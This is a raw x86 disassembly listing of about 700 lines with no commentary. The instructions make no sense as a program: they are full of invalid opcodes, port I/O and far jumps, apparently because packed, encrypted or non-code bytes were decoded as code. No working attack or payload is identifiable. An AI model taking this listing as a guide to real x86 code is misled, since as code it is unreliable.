  409f4c:	inc    BYTE PTR ds:0xab5fe86d
  409f52:	aas    
  409f53:	or     bl,dl
  409f55:	add    al,0x4a
  409f57:	sub    eax,DWORD PTR [edx-0x2f]
  409f5a:	and    al,0x53
  409f5c:	mov    eax,0x4fd03ca8
  409f61:	lahf   
  409f62:	inc    ecx
  409f63:	pop    ebx
  409f64:	popa   
  409f65:	inc    ecx
  409f66:	xchg   ebp,eax
  409f67:	ret    0xfbfc
  409f6a:	(bad)  
  409f6b:	mov    esi,0xac5923c3
  409f70:	in     eax,dx
  409f71:	cmp    BYTE PTR [edx],al
  409f73:	das    
  409f74:	sub    al,0xed
  409f76:	imul   ebp,ebp,0x25
  409f79:	inc    eax
  409f7a:	xchg   DWORD PTR [ecx],esp
  409f7c:	(bad)  
  409f7d:	loop   0x409f4b
  409f7f:	mov    al,ds:0x50efc216
  409f84:	(bad)  
  409f85:	mov    ds:0x62755a49,eax
  409f8a:	push   ebx
  409f8b:	add    ch,al
  409f8d:	jns    0x409f9c
  409f8f:	jg     0x409fbf
  409f91:	loop   0x409f9f
  409f93:	loopne 0x409f59
  409f95:	pushf  
  409f96:	sub    BYTE PTR [ebx],al
  409f98:	xor    BYTE PTR [eax],cl
  409f9a:	jl     0x409f6a
  409f9c:	mov    ch,0xe8
  409f9e:	(bad)  
  409fa0:	sbb    BYTE PTR [edx-0x1c],cl
  409fa3:	test   cl,al
  409fa5:	xchg   DWORD PTR [esi-0x6e],ecx
  409fa8:	push   esp
  409fa9:	ds sbb eax,0x25e766d1
  409faf:	push   eax
  409fb0:	jo     0x409fbe
  409fb2:	mov    bl,0x1b
  409fb4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  409fb5:	out    0x93,al
  409fb7:	jp     0x409fee
  409fb9:	push   esp
  409fba:	mov    BYTE PTR [ebp-0x7d],bl
  409fbd:	mov    ds:0x802d0c92,eax
  409fc2:	ficom  WORD PTR [ebp+0x64]
  409fc5:	jno    0x409fd8
  409fc7:	mov    ah,0xea
  409fc9:	fisttp WORD PTR [edx+0x24911b59]
  409fcf:	xor    ch,dl
  409fd1:	push   edi
  409fd2:	int    0x80
  409fd4:	and    DWORD PTR [ebx-0x3dd41999],ebp
  409fda:	push   esp
  409fdb:	clc    
  409fdc:	mov    edi,0xd1ccf2a2
  409fe1:	(bad)  
  409fe2:	mov    cs,WORD PTR ds:0x90ec2b2e
  409fe8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  409fe9:	and    bl,ah
  409feb:	test   al,0xb
  409fed:	shr    DWORD PTR cs:[edx],cl
  409ff0:	push   eax
  409ff1:	int3   
  409ff2:	jecxz  0x409fbc
  409ff4:	push   eax
  409ff5:	inc    ecx
  409ff6:	ss jno 0x409fa6
  409ff9:	outs   dx,DWORD PTR ds:[esi]
  409ffa:	sub    al,0x44
  409ffc:	test   ebx,esi
  409ffe:	test   BYTE PTR [ebp-0x55],ah
  40a001:	sbb    DWORD PTR [esi+0x57],0x388b3a4a
  40a008:	lods   al,BYTE PTR ds:[esi]
  40a009:	jo     0x40a058
  40a00b:	loopne 0x40a02b
  40a00d:	shr    DWORD PTR [esi],1
  40a00f:	pushf  
  40a010:	pop    es
  40a011:	in     al,0x2e
  40a013:	sbb    bl,BYTE PTR [eax+0x4b]
  40a016:	ret    
  40a017:	cli    
  40a018:	dec    esi
  40a019:	ins    BYTE PTR es:[edi],dx
  40a01a:	ror    BYTE PTR [edi-0x38ee934e],cl
  40a020:	push   ebx
  40a021:	sbb    si,WORD PTR [ecx-0x31]
  40a025:	mov    cl,0x51
  40a027:	jno    0x40a015
  40a029:	jge    0x40a058
  40a02b:	imul   ecx,DWORD PTR es:[esi+0xd],0xffffffe2
  40a030:	je     0x40a080
  40a032:	sbb    dl,BYTE PTR [ebx+0x4555d4c6]
  40a038:	jbe    0x40a09f
  40a03a:	cwde   
  40a03b:	fcomp  QWORD PTR [esi+0x64]
  40a03e:	cmp    al,0x7b
  40a040:	and    al,0x15
  40a042:	iret   
  40a043:	mov    ?,WORD PTR [ebx-0x1f]
  40a046:	mov    ah,BYTE PTR [ecx+esi*2]
  40a049:	push   0xb8259f75
  40a04e:	icebp  
  40a04f:	outs   dx,DWORD PTR es:[esi]
  40a051:	xor    DWORD PTR [esi],0x3d7fb35b
  40a057:	hlt    
  40a058:	xchg   edi,eax
  40a059:	je     0x40a022
  40a05b:	imul   DWORD PTR [ebx]
  40a05d:	jl     0x40a0d7
  40a05f:	inc    esp
  40a060:	sbb    edx,ecx
  40a062:	push   es
  40a063:	or     DWORD PTR ds:0x795b1a78,edi
  40a069:	stc    
  40a06a:	aaa    
  40a06b:	lea    ebp,[edi]
  40a06d:	std    
  40a06e:	mov    bl,0xa9
  40a070:	stos   DWORD PTR es:[edi],eax
  40a071:	call   0xfbfa6fed
  40a076:	stos   BYTE PTR es:[edi],al
  40a077:	fdiv   DWORD PTR [esi+0x6fd8e6fe]
  40a07d:	push   ebp
  40a07e:	pusha  
  40a07f:	xor    al,0x9c
  40a081:	leave  
  40a082:	dec    ebx
  40a083:	adc    bh,BYTE PTR [eax-0x63]
  40a086:	and    DWORD PTR [edx],edi
  40a088:	jmp    0xb51f4091
  40a08d:	cwde   
  40a08e:	inc    edx
  40a08f:	or     ecx,DWORD PTR [eax-0x1d29dfe5]
  40a095:	loopne 0x40a033
  40a097:	push   0x12
  40a099:	out    0xb4,eax
  40a09b:	sbb    eax,0xc861d3ce
  40a0a0:	shl    ebp,cl
  40a0a2:	xchg   esi,eax
  40a0a3:	fadd   st(3),st
  40a0a5:	xor    eax,DWORD PTR [ebx-0x1a]
  40a0a8:	sbb    ecx,DWORD PTR [edi]
  40a0aa:	pusha  
  40a0ab:	cdq    
  40a0ac:	aaa    
  40a0ad:	fnstenv [edx-0x10]
  40a0b0:	or     BYTE PTR [ebp+0x60b40e45],ch
  40a0b6:	pop    ebx
  40a0b7:	xchg   edx,eax
  40a0b8:	xor    dh,al
  40a0ba:	outs   dx,BYTE PTR ds:[esi]
  40a0bb:	or     eax,0xac2a119f
  40a0c0:	mov    dh,0x7
  40a0c2:	dec    edi
  40a0c3:	es pop eax
  40a0c5:	mov    ds:0x595735c8,al
  40a0ca:	cwde   
  40a0cb:	fisub  DWORD PTR [ebp-0x6b]
  40a0ce:	in     eax,dx
  40a0cf:	pop    esp
  40a0d0:	xchg   edi,eax
  40a0d1:	mov    ch,0xf1
  40a0d3:	cwde   
  40a0d4:	xchg   ecx,eax
  40a0d5:	sbb    eax,0xdfdc758a
  40a0da:	jg     0x40a0af
  40a0dc:	or     eax,0xe054817e
  40a0e1:	push   ds
  40a0e2:	pop    edx
  40a0e3:	cdq    
  40a0e4:	pop    es
  40a0e5:	jns    0x40a0b1
  40a0e7:	fidivr DWORD PTR [ebx]
  40a0e9:	sub    BYTE PTR [esi+0x1d],dl
  40a0ec:	aam    0x4a
  40a0ee:	jo     0x40a0e7
  40a0f0:	sub    DWORD PTR [ebx-0x1ac2e49e],ebp
  40a0f6:	jnp    0x40a09e
  40a0f8:	dec    ebx
  40a0f9:	cmp    BYTE PTR [edx],bh
  40a0fb:	daa    
  40a0fc:	adc    eax,0xdb7bf534
  40a101:	mov    ss,WORD PTR [ebp+edi*1+0x38118853]
  40a108:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40a109:	popa   
  40a10a:	inc    ebx
  40a10b:	cmp    BYTE PTR [esi+0x1da7e7d8],al
  40a111:	sub    eax,0xf01a5e76
  40a116:	mov    dl,0x2e
  40a118:	out    0x24,eax
  40a11a:	jno    0x40a0e2
  40a11c:	es mov eax,ds
  40a11f:	xor    dh,bl
  40a121:	fcmovbe st,st(1)
  40a123:	adc    dl,BYTE PTR [ebp-0x4e4a3870]
  40a129:	je     0x40a12a
  40a12b:	mov    ebx,0x777866c7
  40a130:	cdq    
  40a131:	inc    esp
  40a132:	ret    
  40a133:	push   0xffffffec
  40a135:	loop   0x40a0ba
  40a137:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40a138:	add    ebx,edx
  40a13a:	loop   0x40a141
  40a13c:	cwde   
  40a13d:	or     bl,BYTE PTR [ecx-0x31]
  40a140:	cs push cs
  40a142:	sub    al,BYTE PTR [edi]
  40a144:	mov    es,WORD PTR [edi-0x16deb8e7]
  40a14a:	mov    dl,0x6f
  40a14c:	hlt    
  40a14d:	fiadd  DWORD PTR [edx-0x4d]
  40a150:	out    dx,al
  40a151:	push   ss
  40a152:	out    0xd4,al
  40a154:	xchg   DWORD PTR [ebp+0x70],esi
  40a157:	(bad)  
  40a158:	popa   
  40a159:	push   ecx
  40a15a:	stos   BYTE PTR es:[edi],al
  40a15b:	leave  
  40a15c:	sbb    al,0xc5
  40a15e:	or     eax,0xeb9d028b
  40a163:	stc    
  40a164:	call   0xb3e2:0x3ba4ce10
  40a16b:	sub    dh,ah
  40a16d:	popf   
  40a16e:	sbb    esi,DWORD PTR [edx-0x6ebebe48]
  40a174:	je     0x40a13c
  40a176:	xchg   edx,eax
  40a177:	sbb    dl,BYTE PTR [edi+ecx*1-0x5a5f63a6]
  40a17e:	jg     0x40a1ac
  40a180:	mov    dl,0x4f
  40a182:	adc    eax,0xbdb76456
  40a187:	or     DWORD PTR [edi+0xc],edx
  40a18a:	mov    WORD PTR [edi+eiz*2],gs
  40a18d:	iret   
  40a18e:	mov    eax,0xfdd0dd04
  40a193:	pop    ebp
  40a194:	mov    edi,0xb58d10f2
  40a199:	pop    ss
  40a19a:	mov    BYTE PTR [edx-0x26f26915],bh
  40a1a0:	imul   BYTE PTR [esi+0x60]
  40a1a3:	cmp    DWORD PTR [esi-0x18],edi
  40a1a6:	jno    0x40a13d
  40a1a8:	sbb    DWORD PTR [eax+0x34],0x44
  40a1ac:	jle    0x40a15f
  40a1ae:	inc    eax
  40a1af:	js     0x40a1f9
  40a1b1:	pop    ss
  40a1b2:	cmp    BYTE PTR ds:0x56b893b4,ah
  40a1b8:	or     BYTE PTR [ecx-0x5a],dl
  40a1bb:	out    0x73,al
  40a1bd:	push   ebp
  40a1be:	std    
  40a1bf:	repz mov edx,0xeaa2ced
  40a1c5:	loope  0x40a1c8
  40a1c7:	cwde   
  40a1c8:	aam    0x6e
  40a1ca:	cmc    
  40a1cb:	add    eax,0xb7f577f2
  40a1d0:	sbb    DWORD PTR fs:[edi-0x150b6dc3],0xfffffff1
  40a1d8:	data16 cmc 
  40a1da:	std    
  40a1db:	shr    dh,0xf0
  40a1de:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40a1df:	lds    esp,FWORD PTR [ebx-0x3]
  40a1e2:	jp     0x40a1fe
  40a1e4:	inc    eax
  40a1e5:	mov    ds:0xbad2479f,al
  40a1ea:	and    cl,BYTE PTR [edi-0x45]
  40a1ed:	add    DWORD PTR [esi-0x6f0a9ef0],eax
  40a1f3:	mov    esi,0xb25452dc
  40a1f8:	in     eax,dx
  40a1f9:	jne    0x40a1d5
  40a1fb:	xchg   BYTE PTR [ebx],bl
  40a1fd:	add    esi,ebp
  40a1ff:	scas   eax,DWORD PTR es:[edi]
  40a200:	push   cs
  40a201:	or     BYTE PTR [edx],dh
  40a203:	lods   al,BYTE PTR ds:[esi]
  40a204:	retf   
  40a205:	and    eax,0x43cf027d
  40a20a:	jmp    edi
  40a20c:	xor    DWORD PTR ds:0x7b13eb1d,eax
  40a212:	call   0xfff2:0x7217f142
  40a219:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40a21a:	sub    DWORD PTR [edi],ebp
  40a21c:	out    dx,al
  40a21d:	push   ds
  40a21e:	mov    ebx,0x7dc31fb3
  40a223:	push   esp
  40a224:	daa    
  40a225:	outs   dx,DWORD PTR ds:[esi]
  40a226:	in     al,0x63
  40a228:	test   DWORD PTR [eax-0x23244201],esp
  40a22e:	mov    esp,0xf0396a7
  40a233:	push   ecx
  40a234:	call   0x7d76:0xdc941d13
  40a23b:	mov    edx,0xc14040ed
  40a240:	adc    ch,al
  40a242:	mov    esi,0x501337a0
  40a247:	and    al,0xf3
  40a249:	lods   al,BYTE PTR ds:[esi]
  40a24a:	or     DWORD PTR [edx+eiz*2+0x1a39d823],edi
  40a251:	push   ds
  40a252:	(bad)  
  40a253:	jo     0x40a2c1
  40a255:	(bad)  
  40a256:	mov    ebx,0xe52c1db
  40a25b:	ror    esp,cl
  40a25d:	cmp    DWORD PTR [edi+0x7b],edx
  40a260:	push   0x5698c3f7
  40a265:	jmp    0xcfe4:0xcc8823e
  40a26c:	test   eax,0x44637b0a
  40a271:	imul   edi,DWORD PTR [edi+edi*8],0xffffffbc
  40a275:	test   eax,0xcfe67095
  40a27a:	aas    
  40a27b:	lods   eax,DWORD PTR ds:[esi]
  40a27c:	adc    edi,esp
  40a27e:	dec    eax
  40a27f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40a280:	cli    
  40a281:	jnp    0x40a221
  40a283:	dec    esi
  40a284:	rcr    DWORD PTR [esp+eax*8-0x2],1
  40a288:	push   ebx
  40a289:	fs pop ss
  40a28b:	mov    edi,0x491966ab
  40a290:	inc    ch
  40a292:	into   
  40a293:	pop    ds
  40a294:	test   eax,0xb032e071
  40a299:	std    
  40a29a:	loope  0x40a261
  40a29c:	inc    ebp
  40a29d:	addr16 adc eax,edx
  40a2a0:	cmp    DWORD PTR [edi+0x32],0x18c5962d
  40a2a7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40a2a8:	aad    0x7e
  40a2aa:	aad    0xd1
  40a2ac:	inc    edi
  40a2ad:	jae    0x40a2b2
  40a2af:	xchg   esp,eax
  40a2b0:	stos   BYTE PTR es:[edi],al
  40a2b1:	outs   dx,BYTE PTR ds:[esi]
  40a2b2:	mov    ds:0x2a710e3d,al
  40a2b7:	popf   
  40a2b8:	addps  xmm7,XMMWORD PTR [ebx]
  40a2bb:	mov    edx,0x47240190
  40a2c0:	imul   al
  40a2c2:	mov    ds:0x2b18267b,al
  40a2c7:	lock dec ecx
  40a2c9:	pop    eax
  40a2ca:	pop    es
  40a2cb:	out    0x31,al
  40a2cd:	adc    BYTE PTR [edi+0x45],cl
  40a2d0:	sbb    BYTE PTR [edx+0x6f],cl
  40a2d3:	lock (bad) 
  40a2d5:	mov    al,0xae
  40a2d7:	les    ebp,FWORD PTR [ebp+0x5674d30b]
  40a2dd:	icebp  
  40a2de:	adc    ebx,DWORD PTR [ebx]
  40a2e0:	ret    
  40a2e1:	jbe    0x40a2ad
  40a2e3:	int    0x2d
  40a2e5:	xchg   ebx,eax
  40a2e6:	xor    eax,0x586e76d1
  40a2eb:	enter  0xd57b,0xa4
  40a2ef:	adc    ecx,edx
  40a2f1:	pop    eax
  40a2f2:	inc    esp
  40a2f3:	sbb    edx,DWORD PTR [edi]
  40a2f5:	hlt    
  40a2f6:	cld    
  40a2f7:	inc    eax
  40a2f8:	cmp    eax,0x18891418
  40a2fd:	(bad)  
  40a2fe:	(bad)  
  40a2ff:	lods   eax,DWORD PTR ds:[esi]
  40a300:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40a301:	inc    ebp
  40a302:	or     BYTE PTR [edx+0x70849d34],dl
  40a308:	outs   dx,DWORD PTR ds:[esi]
  40a309:	in     al,0x9b
  40a30b:	std    
  40a30c:	xchg   edx,eax
  40a30d:	shl    BYTE PTR [ecx],cl
  40a30f:	xchg   esi,eax
  40a310:	xchg   edi,eax
  40a311:	adc    eax,0x59dc6b15
  40a316:	inc    ecx
  40a317:	and    DWORD PTR ds:0x4f483328,0xafae7201
  40a321:	outs   dx,BYTE PTR ds:[esi]
  40a322:	cdq    
  40a323:	int3   
  40a324:	jo     0x40a347
  40a326:	rcl    BYTE PTR [edx],cl
  40a328:	test   BYTE PTR [edx+0x4fb3e4eb],dh
  40a32e:	lahf   
  40a32f:	sbb    bh,BYTE PTR [eax-0x7f]
  40a332:	inc    ebx
  40a333:	imul   DWORD PTR [edi]
  40a335:	push   bp
  40a337:	adc    eax,0xb617fc0
  40a33c:	xor    eax,ebx
  40a33e:	or     ebp,DWORD PTR [ebx-0x1a]
  40a341:	mov    BYTE PTR [ebx-0x19],ch
  40a344:	or     ebx,DWORD PTR [esi+eiz*4-0x3ebfd536]
  40a34b:	mov    edi,0x6a17e9e0
  40a350:	dec    ecx
  40a351:	ds mov ebp,0xd81ef409
  40a357:	test   DWORD PTR [esi-0xc4bc8a0],ebx
  40a35d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40a35e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40a35f:	xor    BYTE PTR [edi-0x446c6c01],al
  40a365:	adc    dh,BYTE PTR [eax]
  40a367:	push   0xffffffdd
  40a369:	or     ch,cl
  40a36b:	push   ecx
  40a36c:	mov    ?,WORD PTR [ebx-0x2d826869]
  40a372:	imul   esp,DWORD PTR [edi+0x1370c67c],0xd62ea0a0
  40a37c:	pop    edi
  40a37d:	mov    esi,0x2418374
  40a382:	idiv   edx
  40a384:	push   edx
  40a385:	in     al,0x3f
  40a387:	add    DWORD PTR [edi+eiz*8-0x2d],0x78
  40a38c:	dec    eax
  40a38d:	(bad)  
  40a38e:	mov    ds:0x65b39aa4,eax
  40a393:	mov    ds:0xaf6b2728,eax
  40a398:	repnz pop ebx
  40a39a:	lods   eax,DWORD PTR ds:[esi]
  40a39b:	push   ebp
  40a39c:	cmc    
  40a39d:	test   DWORD PTR [esi],ebp
  40a39f:	jmp    0x7e5:0x428643c6
  40a3a6:	mov    ebp,esi
  40a3a8:	mov    edx,0x5592a2d4
  40a3ad:	push   edi
  40a3ae:	inc    eax
  40a3af:	cld    
  40a3b0:	(bad)  
  40a3b1:	xor    al,0xc4
  40a3b3:	cld    
  40a3b4:	rcr    eax,cl
  40a3b6:	jecxz  0x40a347
  40a3b8:	sar    esp,0x6b
  40a3bb:	dec    ecx
  40a3bc:	sbb    ch,BYTE PTR [ebx-0x4ad1d463]
  40a3c2:	jae    0x40a34a
  40a3c4:	jle    0x40a380
  40a3c6:	(bad)  
  40a3c8:	popa   
  40a3c9:	adc    esi,ebx
  40a3cb:	imul   esi,DWORD PTR [edi],0x81f8cbe6
  40a3d1:	js     0x40a3c6
  40a3d3:	cmp    ebp,DWORD PTR [edx]
  40a3d5:	xor    eax,0xf75d63e8
  40a3da:	iret   
  40a3db:	inc    ebp
  40a3dc:	push   es
  40a3dd:	dec    ebp
  40a3de:	test   bl,ah
  40a3e0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40a3e1:	mov    dh,0x8d
  40a3e3:	imul   edi,DWORD PTR [edx],0xfffffff7
  40a3e6:	xor    BYTE PTR [edx+eax*2+0x716b469f],ch
  40a3ed:	ins    DWORD PTR es:[edi],dx
  40a3ee:	sbb    eax,esp
  40a3f0:	xor    DWORD PTR [ebx-0xb],edi
  40a3f3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40a3f4:	add    ebx,esp
  40a3f6:	sub    DWORD PTR [ebx],esi
  40a3f8:	test   BYTE PTR [edi],al
  40a3fa:	aas    
  40a3fb:	rcr    BYTE PTR [ecx-0x16],cl
  40a3fe:	(bad)  
  40a3ff:	fld    DWORD PTR [ecx-0x32]
  40a402:	jp     0x40a3c6
  40a404:	test   DWORD PTR [edx+0x471cbef],ebp
  40a40a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40a40b:	pop    esp
  40a40c:	mov    ebx,DWORD PTR [eax-0x4c]
  40a40f:	out    dx,eax
  40a410:	sub    DWORD PTR [edi+0x57],ecx
  40a413:	pop    es
  40a414:	test   eax,0xafce9f21
  40a419:	mov    dh,0xb8
  40a41b:	cmp    dh,ch
  40a41d:	push   esp
  40a41e:	jno    0x40a480
  40a420:	jnp    0x40a43c
  40a422:	cli    
  40a423:	jmp    0x6395f0a
  40a428:	out    0x49,eax
  40a42a:	mov    edx,0x7f9a7338
  40a42f:	push   ebx
  40a430:	mov    cl,0xbd
  40a432:	outs   dx,DWORD PTR ds:[esi]
  40a433:	cmp    DWORD PTR [ebp+eiz*1-0x5feabb82],ebx
  40a43a:	pop    eax
  40a43b:	call   0xaae41de3
  40a440:	mov    ds:0x273c670b,al
  40a445:	shr    ch,cl
  40a447:	cwde   
  40a448:	mov    dl,0x6d
  40a44a:	sbb    DWORD PTR [eax],0xffffff80
  40a44d:	dec    ebp
  40a44e:	fld    DWORD PTR [esi]
  40a450:	popf   
  40a451:	jne    0x40a4a5
  40a453:	pop    ecx
  40a454:	fstp   QWORD PTR [ebx+ecx*4+0xa3dee6b]
  40a45b:	std    
  40a45c:	stos   DWORD PTR es:[edi],eax
  40a45d:	and    dl,BYTE PTR [edi-0x57059e2b]
  40a463:	ficom  WORD PTR [edx+0x4f]
  40a466:	inc    ecx
  40a467:	sbb    eax,0xe80ac245
  40a46c:	and    DWORD PTR [ecx],eax
  40a46e:	call   DWORD PTR [ecx-0x1fb29243]
  40a474:	cmp    BYTE PTR ds:[edx+eax*4],dh
  40a478:	adc    edi,DWORD PTR [edi]
  40a47a:	dec    ebp
  40a47b:	iret   
  40a47c:	xchg   ecx,eax
  40a47d:	push   DWORD PTR [edi+0xd]
  40a480:	pop    esp
  40a481:	push   eax
  40a482:	leave  
  40a483:	pop    eax
  40a484:	sub    eax,0x5ce9b2bb
  40a489:	jno    0x40a431
  40a48b:	pushf  
  40a48c:	add    DWORD PTR ds:0x90ebcc22,0xfdf084c8
  40a496:	aaa    
  40a497:	dec    esi
  40a498:	push   eax
  40a499:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40a49a:	imul   edi,DWORD PTR [ecx+ebx*1-0x5d685493],0x1a2d5a67
  40a4a5:	fistp  DWORD PTR [ebp+ecx*4+0x1805a53a]
  40a4ac:	pop    ds
  40a4ad:	xchg   esi,eax
  40a4ae:	xor    al,0x4d
  40a4b0:	fadd   st,st(0)
  40a4b2:	or     eax,0xffffffc3
  40a4b5:	mov    edx,esp
  40a4b7:	fldcw  WORD PTR [ebx]
  40a4b9:	push   ebp
  40a4ba:	dec    eax
  40a4bb:	mov    bh,0x29
  40a4bd:	call   0x9112:0x2365f7b3
  40a4c4:	outs   dx,DWORD PTR ds:[esi]
  40a4c5:	inc    esi
  40a4c6:	inc    esi
  40a4c7:	jmp    0xcef126fd
  40a4cc:	jge    0x40a486
  40a4ce:	mov    bl,0x77
  40a4d0:	cwde   
  40a4d1:	(bad)  
  40a4d2:	adc    eax,0xf0c22462
  40a4d7:	(bad)  
  40a4d8:	jge    0x40a496
  40a4da:	fnstsw WORD PTR [ecx]
  40a4dc:	or     eax,0x4dbe26ee
  40a4e1:	cwde   
  40a4e2:	xor    DWORD PTR [esi-0x64],ecx
  40a4e5:	lahf   
  40a4e6:	and    eax,0x4fc6121f
  40a4eb:	ds push es
  40a4ed:	sbb    al,0x6f
  40a4ef:	pop    ds
  40a4f0:	xchg   esp,eax
  40a4f1:	aaa    
  40a4f2:	call   0x124542ee
  40a4f7:	pop    ecx
  40a4f8:	jecxz  0x40a4f6
  40a4fa:	xchg   esp,eax
  40a4fb:	inc    ebp
  40a4fc:	pushf  
  40a4fd:	dec    eax
  40a4fe:	gs mov edx,0x50c3190
  40a504:	adc    ebx,edi
  40a506:	rcr    esp,cl
  40a508:	jecxz  0x40a55a
  40a50a:	cwde   
  40a50b:	pop    ds
  40a50c:	aaa    
  40a50d:	push   edi
  40a50e:	sub    eax,0x302ae881
  40a513:	call   0x2c8:0x380b85b2
  40a51a:	iret   
  40a51b:	pop    ecx
  40a51c:	(bad)  
  40a51d:	retf   
  40a51e:	repnz ins BYTE PTR es:[edi],dx
  40a520:	push   ecx
  40a521:	xchg   ebp,eax
  40a522:	xchg   esi,eax
  40a523:	pop    es
  40a524:	test   DWORD PTR [esi+0x4f],0xe65f6416
  40a52b:	sub    dh,BYTE PTR [esi]
  40a52d:	pop    ss
  40a52e:	jno    0x40a4ed
  40a530:	mov    bl,0xff
  40a532:	nop
  40a533:	arpl   ax,ax
  40a535:	dec    edi
  40a536:	lahf   
  40a537:	xchg   esi,eax
  40a538:	cmp    BYTE PTR [ecx+0xd],cl
  40a53b:	call   0x73cda2b4
  40a540:	ret    0x791d
  40a543:	mov    edi,0xbefe88c
  40a548:	jmp    0x40a5bf
  40a54a:	add    cl,BYTE PTR [ebp-0x1ebbb974]
  40a550:	fdiv   DWORD PTR [edi+edi*2-0x2154b970]
  40a557:	fisttp QWORD PTR [edx-0x6d]
  40a55a:	push   ecx
  40a55b:	push   ebp
  40a55c:	fbld   TBYTE PTR [edx+ebx*1]
  40a55f:	cmp    dl,0xef
  40a562:	leave  
  40a563:	mov    BYTE PTR [ebx-0x60],0x4c
  40a567:	jl     0x40a564
  40a569:	inc    ebx
  40a56b:	int3   
  40a56c:	outs   dx,BYTE PTR ds:[esi]
  40a56d:	int    0xfc
  40a56f:	cmp    DWORD PTR [edi-0x64879e8d],esi
  40a575:	cs jo  0x40a5ad
  40a578:	clc    
  40a579:	inc    eax
  40a57a:	aas    
  40a57b:	or     eax,esi
  40a57d:	sbb    al,0xe6
  40a57f:	sbb    DWORD PTR [edi+0x61a39780],ecx
  40a585:	dec    ecx
  40a586:	jge    0x40a5e0
  40a588:	scas   eax,DWORD PTR es:[edi]
  40a589:	pop    esp
  40a58a:	mov    bh,0x69
  40a58c:	not    BYTE PTR [edi+0x14]
  40a58f:	push   ebx
  40a590:	pushf  
  40a591:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40a592:	pop    ss
  40a593:	loop   0x40a534
  40a595:	stc    
  40a596:	in     al,0x19
  40a598:	mov    ebp,0x480e0762
  40a59d:	pop    ebx
  40a59e:	repnz inc edx
  40a5a0:	mov    edi,0x54019ce5
  40a5a5:	or     eax,0x4a13971e
  40a5aa:	fistp  QWORD PTR [ebx-0x1e22e51f]
  40a5b0:	ja     0x40a53e
  40a5b2:	imul   eax,DWORD PTR [ebp-0x60ee7121],0x4d7e81b5
  40a5bc:	push   esp
  40a5bd:	sbb    ch,BYTE PTR [edx+ebp*8]
  40a5c0:	xchg   edi,eax
  40a5c1:	popf   
  40a5c2:	(bad)
  40a5c5:	sbb    eax,edi
  40a5c7:	call   0x22ed:0xf29a515e
  40a5ce:	fistp  DWORD PTR [esi+0x78]
  40a5d1:	add    ebp,DWORD PTR [esi+0xe]
  40a5d4:	jl     0x40a5d5
  40a5d6:	inc    edx
  40a5d7:	xchg   edi,eax
  40a5d8:	and    al,0x43
  40a5da:	adc    ch,ah
  40a5dc:	inc    ebx
  40a5dd:	fistp  DWORD PTR [eax]
  40a5df:	lahf   
  40a5e0:	push   edi
  40a5e1:	jmp    0x40a5bf
  40a5e3:	or     al,0x9c
  40a5e5:	lds    eax,FWORD PTR [ebx-0x17]
  40a5e8:	pop    ebx
  40a5e9:	pushf  
  40a5ea:	and    dl,BYTE PTR [ecx-0x6]
  40a5ed:	(bad)  
  40a5ee:	jne    0x40a578
  40a5f0:	in     al,0xb6
  40a5f2:	icebp  
  40a5f3:	xor    DWORD PTR [ebx+edx*2],esp
  40a5f6:	(bad)  
  40a5f7:	es test eax,0x7c702fbf
  40a5fd:	mov    ecx,ebx
  40a5ff:	sbb    BYTE PTR [esi+eiz*1+0x42254381],ah
  40a606:	pop    esi
  40a607:	and    eax,0x1216ce42
  40a60c:	dec    esi
  40a60d:	(bad)  [ebp-0x1aecda91]
  40a613:	ss aaa 
  40a615:	jns    0x40a5d0
  40a617:	or     edi,0x0
  40a61a:	lea    eax,[ebx+edx*2]
  40a61d:	stos   BYTE PTR es:[edi],al
  40a61e:	mov    al,ds:0x40818560
  40a623:	ds and dl,dh
  40a626:	pop    esp
  40a627:	xchg   sp,ax
  40a629:	jnp    0x40a61c
  40a62b:	push   ds
  40a62c:	stos   BYTE PTR es:[edi],al
  40a62d:	mov    DWORD PTR [ecx],esi
  40a62f:	aas    
  40a630:	in     al,dx
  40a631:	sub    DWORD PTR [ecx+0x71307f08],esp
  40a637:	or     esi,DWORD PTR [esi]
  40a639:	(bad)  
  40a63a:	in     al,dx
  40a63b:	inc    esp
  40a63c:	xor    al,0x1d
  40a63e:	repz out 0x12,eax
  40a641:	imul   ebp,DWORD PTR [edx],0xffffff9b
  40a644:	push   ebp
  40a645:	stos   BYTE PTR es:[edi],al
  40a646:	shr    DWORD PTR [ebp+0x26],1
  40a649:	xchg   esp,eax
  40a64a:	stos   BYTE PTR es:[edi],al
  40a64b:	jo     0x40a5d4
  40a64d:	cmc    
  40a64e:	mov    bh,0xbc
  40a650:	and    eax,0x996ed069
  40a655:	sbb    eax,0x72e4e242
  40a65a:	aaa    
  40a65b:	cmp    al,0x4
  40a65d:	pop    esp
  40a65e:	in     al,0xdd
  40a660:	inc    esi
  40a661:	push   ecx
  40a662:	jmp    0x40a69e
  40a664:	ins    BYTE PTR es:[edi],dx
  40a665:	fldenv [edi+0x1f]
  40a668:	cmp    al,dl
  40a66a:	lea    edi,[eax-0x66156bed]
  40a670:	ss xchg ebx,eax
  40a672:	stc    
  40a673:	mov    eax,ds:0xf53051b5
  40a678:	jp     0x40a60c
  40a67a:	or     DWORD PTR [ecx+0x32434a3d],edx
  40a680:	jnp    0x40a6fa
  40a682:	xor    eax,0xa23a7a63
  40a687:	pop    esi
  40a688:	push   edi
  40a68a:	add    ch,BYTE PTR [ebp+0x1e1d7003]
  40a690:	pop    ss
  40a691:	jle    0x40a654
  40a693:	outs   dx,DWORD PTR ds:[esi]
  40a694:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40a695:	add    eax,0x24204fe8
  40a69a:	mov    edx,0xdc395468
  40a69f:	sbb    BYTE PTR [esi-0x46a0b024],bh
  40a6a5:	lods   al,BYTE PTR ds:[esi]
